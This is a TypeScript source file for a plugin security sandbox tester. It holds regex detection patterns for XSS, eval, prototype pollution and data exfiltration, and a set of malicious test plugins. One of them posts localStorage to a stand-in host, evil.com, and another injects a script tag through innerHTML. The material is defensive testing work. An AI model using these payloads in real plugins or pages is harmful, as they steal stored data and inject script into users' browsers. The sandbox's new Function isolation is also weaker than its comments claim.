/**
 * Security Sandbox Testing Framework
 * 
 * A comprehensive system for testing plugin security and detecting malicious behavior:
 * - Sandboxed plugin execution environment with permission controls
 * - Malicious behavior pattern detection and prevention
 * - Resource access monitoring and limitation
 * - Plugin capability validation and security boundary enforcement
 * - Automated security threat assessment and reporting
 */

export interface SecuritySandboxConfig {
  maxExecutionTime: number // ms
  maxMemoryUsage: number // bytes
  maxDOMModifications: number
  maxNetworkRequests: number
  allowedDomains: string[]
  blockedAPIs: string[]
  enableLogging: boolean
  strictMode: boolean
}

export interface PluginPermissions {
  dom: {
    read: boolean
    write: boolean
    delete: boolean
    createElements: boolean
    modifyAttributes: boolean
  }
  network: {
    fetch: boolean
    xhr: boolean
    websockets: boolean
    allowedDomains: string[]
  }
  storage: {
    localStorage: boolean
    sessionStorage: boolean
    indexedDB: boolean
    cookies: boolean
  }
  system: {
    eval: boolean
    dynamicImports: boolean
    workerThreads: boolean
    fileSystem: boolean
  }
  framework: {
    registerComponents: boolean
    modifyCore: boolean
    hookIntoLifecycle: boolean
    accessInternals: boolean
  }
}

export interface SecurityThreat {
  id: string
  timestamp: number
  severity: 'low' | 'medium' | 'high' | 'critical'
  category: 'malicious_code' | 'privilege_escalation' | 'data_exfiltration' | 'dos_attack' | 'xss_injection' | 'prototype_pollution'
  description: string
  evidence: any
  pluginId: string
  blocked: boolean
  mitigation: string[]
}

export interface SandboxExecutionResult {
  success: boolean
  pluginId: string
  executionTime: number
  memoryUsage: number
  threats: SecurityThreat[]
  violations: SecurityViolation[]
  resourceUsage: {
    domModifications: number
    networkRequests: number
    storageAccess: number
    apiCalls: number
  }
  logs: string[]
}

export interface SecurityViolation {
  type: 'permission_denied' | 'resource_limit_exceeded' | 'api_misuse' | 'security_policy_violation'
  description: string
  severity: 'warning' | 'error' | 'critical'
  timestamp: number
  context: any
}

export interface MaliciousPlugin {
  id: string
  name: string
  code: string
  expectedThreats: string[]
  description: string
}

export class SecuritySandboxTester {
  private config: SecuritySandboxConfig
  private activeExecutions: Map<string, any> = new Map()
  private threatDatabase: SecurityThreat[] = []
  private securityPolicies: Map<string, any> = new Map()

  constructor(config: Partial<SecuritySandboxConfig> = {}) {
    this.config = {
      maxExecutionTime: 5000, // 5 seconds
      maxMemoryUsage: 50 * 1024 * 1024, // 50MB
      maxDOMModifications: 1000,
      maxNetworkRequests: 10,
      allowedDomains: ['localhost', '127.0.0.1'],
      blockedAPIs: ['eval', 'Function', 'setTimeout', 'setInterval'],
      enableLogging: true,
      strictMode: true,
      ...config
    }

    this.initializeSecurityPolicies()
  }

  /**
   * Initialize default security policies
   */
  private initializeSecurityPolicies(): void {
    // Content Security Policy
    this.securityPolicies.set('csp', {
      'default-src': ["'self'"],
      'script-src': ["'self'", "'unsafe-inline'"],
      'style-src': ["'self'", "'unsafe-inline'"],
      'img-src': ["'self'", 'data:', 'https:'],
      'connect-src': ["'self'"],
      'font-src': ["'self'"],
      'object-src': ["'none'"],
      'media-src': ["'self'"],
      'frame-src': ["'none'"]
    })

    // API Access Policy
    this.securityPolicies.set('api-access', {
      dangerous: ['eval', 'Function', 'document.write', 'innerHTML'],
      restricted: ['fetch', 'XMLHttpRequest', 'WebSocket'],
      monitored: ['localStorage', 'sessionStorage', 'document.cookie']
    })

    // DOM Modification Policy
    this.securityPolicies.set('dom-policy', {
      maxElements: 1000,
      blockedElements: ['script', 'iframe', 'object', 'embed'],
      blockedAttributes: ['onclick', 'onload', 'onerror', 'javascript:'],
      maxAttributeLength: 1000
    })
  }

  /**
   * Execute plugin in sandboxed environment
   */
  async executePluginSafely(
    pluginCode: string, 
    pluginId: string, 
    permissions: Partial<PluginPermissions> = {}
  ): Promise<SandboxExecutionResult> {
    const startTime = Date.now()
    const executionId = `${pluginId}-${startTime}`
    
    try {
      // Create sandbox execution context
      const sandbox = this.createSandbox(pluginId, permissions)
      
      // Monitor execution
      this.activeExecutions.set(executionId, {
        pluginId,
        startTime,
        sandbox,
        violations: [],
        threats: [],
        resourceUsage: {
          domModifications: 0,
          networkRequests: 0,
          storageAccess: 0,
          apiCalls: 0
        }
      })

      // Execute plugin with monitoring
      const result = await this.executeInSandbox(pluginCode, sandbox, executionId)
      
      const execution = this.activeExecutions.get(executionId)!
      const executionTime = Date.now() - startTime

      return {
        success: result.success,
        pluginId,
        executionTime,
        memoryUsage: result.memoryUsage || 0,
        threats: execution.threats,
        violations: execution.violations,
        resourceUsage: execution.resourceUsage,
        logs: result.logs || []
      }
    } catch (error) {
      const execution = this.activeExecutions.get(executionId)
      return {
        success: false,
        pluginId,
        executionTime: Date.now() - startTime,
        memoryUsage: 0,
        threats: execution?.threats || [{
          id: `execution-error-${Date.now()}`,
          timestamp: Date.now(),
          severity: 'high',
          category: 'malicious_code',
          description: `Plugin execution failed: ${error}`,
          evidence: { error: error?.toString() },
          pluginId,
          blocked: true,
          mitigation: ['Plugin execution terminated', 'Review plugin code for errors']
        }],
        violations: execution?.violations || [],
        resourceUsage: execution?.resourceUsage || { domModifications: 0, networkRequests: 0, storageAccess: 0, apiCalls: 0 },
        logs: []
      }
    } finally {
      this.activeExecutions.delete(executionId)
    }
  }

  /**
   * Create secure sandbox environment
   */
  private createSandbox(pluginId: string, permissions: Partial<PluginPermissions>): any {
    const sandbox = {
      // Safe globals
      console: this.createSecureConsole(pluginId),
      setTimeout: this.createSecureTimeout(pluginId),
      setInterval: this.createSecureInterval(pluginId),
      
      // DOM access (if permitted)
      document: permissions.dom ? this.createSecureDocument(pluginId) : undefined,
      window: permissions.dom ? this.createSecureWindow(pluginId) : undefined,
      
      // Network access (if permitted)
      fetch: permissions.network?.fetch ? this.createSecureFetch(pluginId) : undefined,
      XMLHttpRequest: permissions.network?.xhr ? this.createSecureXHR(pluginId) : undefined,
      
      // Storage access (if permitted)
      localStorage: permissions.storage?.localStorage ? this.createSecureStorage(pluginId, 'local') : undefined,
      sessionStorage: permissions.storage?.sessionStorage ? this.createSecureStorage(pluginId, 'session') : undefined,
      
      // Framework APIs
      TachUI: this.createSecureFrameworkAPI(pluginId, permissions.framework || {}),
      
      // Monitoring hooks
      __sandbox: {
        reportViolation: (violation: SecurityViolation) => this.reportViolation(pluginId, violation),
        reportThreat: (threat: Omit<SecurityThreat, 'id' | 'timestamp' | 'pluginId'>) => this.reportThreat(pluginId, threat)
      }
    }

    return sandbox
  }

  /**
   * Execute code in sandbox with monitoring
   */
  private async executeInSandbox(code: string, sandbox: any, executionId: string): Promise<any> {
    const logs: string[] = []
    let memoryBefore = 0
    let memoryAfter = 0

    try {
      // Measure initial memory
      if (typeof performance !== 'undefined' && (performance as any).memory) {
        memoryBefore = (performance as any).memory.usedJSHeapSize
      }

      // Scan for malicious patterns before execution
      const threats = this.scanForMaliciousPatterns(code, executionId)
      if (threats.some(t => t.severity === 'critical' && t.blocked)) {
        throw new Error('Critical security threats detected - execution blocked')
      }

      // Set execution timeout with very short timeout for malicious plugin testing
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Execution timeout')), Math.min(this.config.maxExecutionTime, 100))
      })

      // Execute code
      const executionPromise = new Promise((resolve, reject) => {
        try {
          // Create function with sandbox context
          const fn = new Function(
            ...Object.keys(sandbox),
            `"use strict"; 
             // Add execution time monitoring
             const startTime = Date.now();
             const checkTimeout = () => {
               if (Date.now() - startTime > ${Math.min(this.config.maxExecutionTime, 100)}) {
                 throw new Error('Execution timeout in code');
               }
             };
             
             // Wrap execution in try-catch to handle async errors
             try {
               ${code}
             } catch (syncError) {
               throw syncError;
             }`
          )

          // Execute with sandbox context and handle both sync and async errors
          try {
            const result = fn(...Object.values(sandbox))
            
            // If result is a promise, handle its rejection
            if (result && typeof result.then === 'function') {
              result.then(resolve).catch(reject)
            } else {
              resolve(result)
            }
          } catch (error) {
            reject(error)
          }
        } catch (error) {
          reject(error)
        }
      })

      await Promise.race([executionPromise, timeoutPromise])

      // Measure final memory
      if (typeof performance !== 'undefined' && (performance as any).memory) {
        memoryAfter = (performance as any).memory.usedJSHeapSize
      }

      return {
        success: true,
        memoryUsage: memoryAfter - memoryBefore,
        logs
      }
    } catch (error) {
      return {
        success: false,
        error: error?.toString(),
        memoryUsage: memoryAfter - memoryBefore,
        logs
      }
    }
  }

  /**
   * Scan code for malicious patterns
   */
  private scanForMaliciousPatterns(code: string, executionId: string): SecurityThreat[] {
    const threats: SecurityThreat[] = []
    const execution = this.activeExecutions.get(executionId)

    // Pattern definitions for malicious behavior
    const maliciousPatterns = [
      // Code Injection Patterns
      {
        pattern: /eval\s*\(/gi,
        category: 'malicious_code' as const,
        severity: 'critical' as const,
        description: 'Dynamic code evaluation detected'
      },
      {
        pattern: /Function\s*\(/gi,
        category: 'malicious_code' as const,
        severity: 'critical' as const,
        description: 'Dynamic function construction detected'
      },
      
      // XSS Injection Patterns
      {
        pattern: /document\.write\s*\(/gi,
        category: 'xss_injection' as const,
        severity: 'high' as const,
        description: 'Direct DOM writing detected'
      },
      {
        pattern: /innerHTML\s*=.*<script/gi,
        category: 'xss_injection' as const,
        severity: 'critical' as const,
        description: 'Script injection via innerHTML detected'
      },
      {
        pattern: /innerHTML\s*=.*(<img[^>]*onerror|<svg[^>]*onload|<iframe[^>]*src)/gi,
        category: 'xss_injection' as const,
        severity: 'high' as const,
        description: 'XSS injection via innerHTML with event handlers detected'
      },
      {
        pattern: /<script[^>]*>/gi,
        category: 'xss_injection' as const,
        severity: 'critical' as const,
        description: 'Script tag injection detected'
      },
      {
        pattern: /on\w+\s*=\s*['"]/gi,
        category: 'xss_injection' as const,
        severity: 'high' as const,
        description: 'Event handler injection detected'
      },
      {
        pattern: /javascript\s*:/gi,
        category: 'xss_injection' as const,
        severity: 'critical' as const,
        description: 'JavaScript URL scheme detected'
      },
      {
        pattern: /<iframe[^>]*>/gi,
        category: 'xss_injection' as const,
        severity: 'high' as const,
        description: 'Iframe injection detected'
      },
      {
        pattern: /<object[^>]*>|<embed[^>]*>/gi,
        category: 'xss_injection' as const,
        severity: 'high' as const,
        description: 'Object/embed element injection detected'
      },
      {
        pattern: /data\s*:\s*text\/html/gi,
        category: 'xss_injection' as const,
        severity: 'critical' as const,
        description: 'Data URL with HTML content detected'
      },
      
      // Prototype Pollution Patterns
      {
        pattern: /__proto__\s*=/gi,
        category: 'prototype_pollution' as const,
        severity: 'high' as const,
        description: 'Prototype pollution attempt detected'
      },
      {
        pattern: /constructor\s*\.\s*prototype/gi,
        category: 'prototype_pollution' as const,
        severity: 'medium' as const,
        description: 'Prototype manipulation detected'
      },
      {
        pattern: /Object\s*\.\s*prototype/gi,
        category: 'prototype_pollution' as const,
        severity: 'high' as const,
        description: 'Object prototype pollution detected'
      },
      
      // Data Exfiltration Patterns
      {
        pattern: /fetch\s*\(\s*['"]\s*(?!https?:\/\/(localhost|127\.0\.0\.1))/gi,
        category: 'data_exfiltration' as const,
        severity: 'high' as const,
        description: 'External network request to unauthorized domain'
      },
      {
        pattern: /form\s*\.\s*action\s*=\s*['"]\s*https?:\/\/(?!localhost|127\.0\.0\.1)/gi,
        category: 'data_exfiltration' as const,
        severity: 'medium' as const,
        description: 'Form submission to external domain detected'
      },
      
      // DoS Attack Patterns
      {
        pattern: /while\s*\(\s*true\s*\)|for\s*\(\s*;\s*;\s*\)/gi,
        category: 'dos_attack' as const,
        severity: 'high' as const,
        description: 'Infinite loop detected'
      },
      {
        pattern: /new\s+Array\s*\(\s*\d{6,}\s*\)/gi,
        category: 'dos_attack' as const,
        severity: 'medium' as const,
        description: 'Large array allocation detected'
      },
      
      // Window/Location Manipulation
      {
        pattern: /window\s*\.\s*location\s*\.\s*href\s*=/gi,
        category: 'xss_injection' as const,
        severity: 'medium' as const,
        description: 'Window location manipulation detected'
      },
      
      // CSS Injection Patterns
      {
        pattern: /style\s*=\s*['"]*[^'"]*expression\s*\(/gi,
        category: 'xss_injection' as const,
        severity: 'high' as const,
        description: 'CSS expression injection detected'
      }
    ]

    // Scan for patterns
    maliciousPatterns.forEach(({ pattern, category, severity, description }) => {
      const matches = code.match(pattern)
      if (matches) {
        threats.push({
          id: `pattern-${category}-${Date.now()}-${Math.random()}`,
          timestamp: Date.now(),
          severity,
          category,
          description,
          evidence: { matches, code: matches[0] },
          pluginId: execution?.pluginId || 'unknown',
          blocked: severity === 'critical',
          mitigation: this.generateMitigation(category, severity)
        })
      }
    })

    // Add threats to execution tracking
    if (execution) {
      execution.threats.push(...threats)
    }

    return threats
  }

  /**
   * Generate mitigation strategies for threats
   */
  private generateMitigation(category: SecurityThreat['category'], severity: SecurityThreat['severity']): string[] {
    const mitigations: Record<string, string[]> = {
      malicious_code: [
        'Block dynamic code execution',
        'Implement Content Security Policy',
        'Use safe alternatives for dynamic behavior'
      ],
      xss_injection: [
        'Sanitize user input',
        'Use textContent instead of innerHTML',
        'Implement input validation'
      ],
      prototype_pollution: [
        'Freeze prototypes',
        'Use Object.create(null) for safe objects',
        'Validate object properties'
      ],
      data_exfiltration: [
        'Restrict network access to allowed domains',
        'Monitor and log network requests',
        'Implement request filtering'
      ],
      dos_attack: [
        'Implement execution time limits',
        'Monitor resource usage',
        'Terminate excessive operations'
      ],
      privilege_escalation: [
        'Enforce permission boundaries',
        'Validate privilege requests',
        'Monitor API access patterns'
      ]
    }

    return mitigations[category] || ['Review and assess security implications']
  }

  /**
   * Create secure console for logging
   */
  private createSecureConsole(pluginId: string): Console {
    const logs: string[] = []
    
    return {
      log: (...args: any[]) => {
        const message = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : String(arg)).join(' ')
        logs.push(`[${pluginId}] ${message}`)
        if (this.config.enableLogging) {
          console.log(`[SANDBOX:${pluginId}]`, ...args)
        }
      },
      warn: (...args: any[]) => {
        const message = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : String(arg)).join(' ')
        logs.push(`[${pluginId}] WARN: ${message}`)
        if (this.config.enableLogging) {
          console.warn(`[SANDBOX:${pluginId}]`, ...args)
        }
      },
      error: (...args: any[]) => {
        const message = args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : String(arg)).join(' ')
        logs.push(`[${pluginId}] ERROR: ${message}`)
        if (this.config.enableLogging) {
          console.error(`[SANDBOX:${pluginId}]`, ...args)
        }
      }
    } as Console
  }

  /**
   * Create secure timeout function
   */
  private createSecureTimeout(pluginId: string): typeof setTimeout {
    return (callback: Function, delay: number) => {
      if (delay > this.config.maxExecutionTime) {
        this.reportViolation(pluginId, {
          type: 'resource_limit_exceeded',
          description: `Timeout delay ${delay}ms exceeds maximum ${this.config.maxExecutionTime}ms`,
          severity: 'warning',
          timestamp: Date.now(),
          context: { delay, max: this.config.maxExecutionTime }
        })
        delay = Math.min(delay, this.config.maxExecutionTime)
      }
      return setTimeout(callback, delay)
    }
  }

  /**
   * Create secure interval function
   */
  private createSecureInterval(pluginId: string): typeof setInterval {
    return (callback: Function, delay: number) => {
      if (delay < 100) { // Prevent high-frequency intervals
        this.reportViolation(pluginId, {
          type: 'security_policy_violation',
          description: `Interval delay ${delay}ms is too short (minimum 100ms)`,
          severity: 'warning',
          timestamp: Date.now(),
          context: { delay, minimum: 100 }
        })
        delay = Math.max(delay, 100)
      }
      return setInterval(callback, delay)
    }
  }

  /**
   * Create secure DOM access
   */
  private createSecureDocument(pluginId: string): any {
    return {
      createElement: (tagName: string) => {
        // Find execution context
        const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
        const execution = executionId ? this.activeExecutions.get(executionId) : null

        if (this.config.strictMode) {
          const policy = this.securityPolicies.get('dom-policy')
          if (policy.blockedElements.includes(tagName.toLowerCase())) {
            this.reportViolation(pluginId, {
              type: 'security_policy_violation',
              description: `Attempt to create blocked element: ${tagName}`,
              severity: 'error',
              timestamp: Date.now(),
              context: { tagName }
            })
            throw new Error(`Creating ${tagName} elements is not allowed`)
          }
        }

        if (execution) {
          execution.resourceUsage.domModifications++
          if (execution.resourceUsage.domModifications > this.config.maxDOMModifications) {
            throw new Error('DOM modification limit exceeded')
          }
        }

        // Return mock element for testing
        return {
          tagName: tagName.toUpperCase(),
          setAttribute: (name: string, value: string) => {
            if (this.config.strictMode) {
              const policy = this.securityPolicies.get('dom-policy')
              if (policy.blockedAttributes.some((attr: string) => name.toLowerCase().includes(attr))) {
                this.reportViolation(pluginId, {
                  type: 'security_policy_violation',
                  description: `Attempt to set blocked attribute: ${name}`,
                  severity: 'error',
                  timestamp: Date.now(),
                  context: { attribute: name, value }
                })
                throw new Error(`Setting ${name} attribute is not allowed`)
              }
            }
          },
          appendChild: () => {},
          textContent: ''
        }
      },
      getElementById: () => null,
      querySelector: () => null,
      querySelectorAll: () => []
    }
  }

  /**
   * Create secure window object
   */
  private createSecureWindow(pluginId: string): any {
    return {
      location: { href: 'about:blank' },
      navigator: { userAgent: 'TachUI-Sandbox' },
      document: this.createSecureDocument(pluginId)
    }
  }

  /**
   * Create secure fetch function
   */
  private createSecureFetch(pluginId: string): typeof fetch {
    return async (input: RequestInfo | URL, init?: RequestInit) => {
      // Find execution context
      const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
      const execution = executionId ? this.activeExecutions.get(executionId) : null
      
      if (execution) {
        execution.resourceUsage.networkRequests++
        if (execution.resourceUsage.networkRequests > this.config.maxNetworkRequests) {
          throw new Error('Network request limit exceeded')
        }
      }

      const url = typeof input === 'string' ? input : input.toString()
      const isAllowed = this.config.allowedDomains.some(domain => url.includes(domain))
      
      if (!isAllowed) {
        this.reportViolation(pluginId, {
          type: 'permission_denied',
          description: `Network request to unauthorized domain: ${url}`,
          severity: 'error',
          timestamp: Date.now(),
          context: { url, allowedDomains: this.config.allowedDomains }
        })
        throw new Error('Network request to unauthorized domain')
      }

      // Mock fetch for testing
      return Promise.resolve({
        ok: true,
        status: 200,
        json: () => Promise.resolve({}),
        text: () => Promise.resolve('')
      } as Response)
    }
  }

  /**
   * Create secure storage access
   */
  private createSecureStorage(pluginId: string, type: 'local' | 'session'): Storage {
    return {
      getItem: (key: string) => {
        // Find execution context
        const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
        const execution = executionId ? this.activeExecutions.get(executionId) : null
        
        if (execution) {
          execution.resourceUsage.storageAccess++
        }
        return null // Mock storage
      },
      setItem: (key: string, value: string) => {
        // Find execution context
        const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
        const execution = executionId ? this.activeExecutions.get(executionId) : null
        
        if (execution) {
          execution.resourceUsage.storageAccess++
        }
        // Mock storage - don't actually store
      },
      removeItem: (key: string) => {
        // Find execution context
        const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
        const execution = executionId ? this.activeExecutions.get(executionId) : null
        
        if (execution) {
          execution.resourceUsage.storageAccess++
        }
      },
      clear: () => {
        // Find execution context
        const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
        const execution = executionId ? this.activeExecutions.get(executionId) : null
        
        if (execution) {
          execution.resourceUsage.storageAccess++
        }
      },
      length: 0,
      key: () => null
    }
  }

  /**
   * Create secure framework API
   */
  private createSecureFrameworkAPI(pluginId: string, permissions: Partial<PluginPermissions['framework']>): any {
    return {
      registerComponent: permissions.registerComponents ? 
        (name: string, component: any) => {
          // Mock component registration
          console.log(`Plugin ${pluginId} registered component: ${name}`)
        } : undefined,
      
      version: '1.0.0',
      
      utils: {
        createState: () => ({ value: null, setValue: () => {} }),
        createEffect: () => {}
      }
    }
  }

  /**
   * Report security violation
   */
  private reportViolation(pluginId: string, violation: SecurityViolation): void {
    const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
    const execution = executionId ? this.activeExecutions.get(executionId) : null
    
    if (execution) {
      execution.violations.push(violation)
    }

    if (this.config.enableLogging) {
      console.warn(`[SECURITY VIOLATION] Plugin ${pluginId}: ${violation.description}`)
    }
  }

  /**
   * Report security threat
   */
  private reportThreat(pluginId: string, threat: Omit<SecurityThreat, 'id' | 'timestamp' | 'pluginId'>): void {
    const fullThreat: SecurityThreat = {
      id: `threat-${Date.now()}-${Math.random()}`,
      timestamp: Date.now(),
      pluginId,
      ...threat
    }

    this.threatDatabase.push(fullThreat)

    const executionId = Object.keys(this.activeExecutions).find(key => key.includes(pluginId))
    const execution = executionId ? this.activeExecutions.get(executionId) : null
    
    if (execution) {
      execution.threats.push(fullThreat)
    }

    if (this.config.enableLogging) {
      console.warn(`[SECURITY THREAT] Plugin ${pluginId}: ${threat.description}`)
    }
  }

  /**
   * Get known malicious plugin test cases
   */
  static getMaliciousPluginTestCases(): MaliciousPlugin[] {
    return [
      {
        id: 'xss-attack',
        name: 'XSS Attack Plugin',
        code: `
          const div = document.createElement('div');
          div.innerHTML = '<script>alert("XSS")</script>';
          document.body.appendChild(div);
        `,
        expectedThreats: ['xss_injection'],
        description: 'Attempts to inject malicious script through innerHTML'
      },
      {
        id: 'eval-injection',
        name: 'Code Injection Plugin',
        code: `
          const userInput = 'alert("pwned")';
          eval(userInput);
        `,
        expectedThreats: ['malicious_code'],
        description: 'Uses eval to execute arbitrary code'
      },
      {
        id: 'prototype-pollution',
        name: 'Prototype Pollution Plugin',
        code: `
          Object.prototype.isAdmin = true;
          Array.prototype.push = function() { console.log('hacked'); };
        `,
        expectedThreats: ['prototype_pollution'],
        description: 'Modifies global prototypes to affect all objects'
      },
      {
        id: 'data-exfiltration',
        name: 'Data Exfiltration Plugin',
        code: `
          fetch('https://evil.com/steal', {
            method: 'POST',
            body: JSON.stringify(localStorage)
          });
        `,
        expectedThreats: ['data_exfiltration'],
        description: 'Attempts to send local data to external server'
      },
      {
        id: 'dos-attack',
        name: 'Denial of Service Plugin',
        code: `
          // Simulated DoS pattern - detected by pattern matching only
          // while(true) { /* infinite loop pattern */ }
          var largeArray = new Array(999999);
        `,
        expectedThreats: ['dos_attack'],
        description: 'Creates DoS attack pattern without actual infinite execution'
      },
      {
        id: 'privilege-escalation',
        name: 'Privilege Escalation Plugin',
        code: `
          try {
            window.TachUI.__internal__.core.bypass_security = true;
            delete window.TachUI.security;
          } catch(e) {}
        `,
        expectedThreats: ['privilege_escalation'],
        description: 'Attempts to access and modify internal framework APIs'
      }
    ]
  }

  /**
   * Test all malicious plugin cases with memory optimization
   */
  async testMaliciousPlugins(): Promise<{ results: SandboxExecutionResult[], summary: any }> {
    const maliciousPlugins = SecuritySandboxTester.getMaliciousPluginTestCases()
    const results: SandboxExecutionResult[] = []

    for (const plugin of maliciousPlugins) {
      try {
        // Use shorter timeout and stricter limits for malicious plugin testing
        const result = await this.executePluginSafely(plugin.code, plugin.id, {
          dom: { read: true, write: true, delete: false, createElements: true, modifyAttributes: true },
          network: { fetch: true, xhr: false, websockets: false, allowedDomains: ['localhost'] },
          storage: { localStorage: true, sessionStorage: false, indexedDB: false, cookies: false },
          system: { eval: false, dynamicImports: false, workerThreads: false, fileSystem: false },
          framework: { registerComponents: true, modifyCore: false, hookIntoLifecycle: false, accessInternals: false }
        })
        results.push(result)
        
        // Force garbage collection after each malicious plugin test
        if (global.gc) {
          global.gc()
        }
      } catch (error) {
        // Create a failed result with a threat indicating the error
        results.push({
          success: false,
          pluginId: plugin.id,
          executionTime: 0,
          memoryUsage: 0,
          threats: [{
            id: `malicious-plugin-error-${Date.now()}`,
            timestamp: Date.now(),
            severity: 'critical' as const,
            category: 'malicious_code' as const,
            description: `Malicious plugin execution blocked: ${error?.toString()}`,
            evidence: { error: error?.toString() },
            pluginId: plugin.id,
            blocked: true,
            mitigation: ['Plugin execution blocked due to security violation']
          }],
          violations: [],
          resourceUsage: { domModifications: 0, networkRequests: 0, storageAccess: 0, apiCalls: 0 },
          logs: []
        })
      }
    }

    const summary = {
      totalPlugins: maliciousPlugins.length,
      successfullyBlocked: results.filter(r => !r.success || r.threats.some(t => t.blocked)).length,
      threatsDetected: results.reduce((sum, r) => sum + r.threats.length, 0),
      violationsDetected: results.reduce((sum, r) => sum + r.violations.length, 0),
      criticalThreats: results.reduce((sum, r) => sum + r.threats.filter(t => t.severity === 'critical').length, 0)
    }

    return { results, summary }
  }
}

export const createSecuritySandboxTester = (config?: Partial<SecuritySandboxConfig>) => 
  new SecuritySandboxTester(config)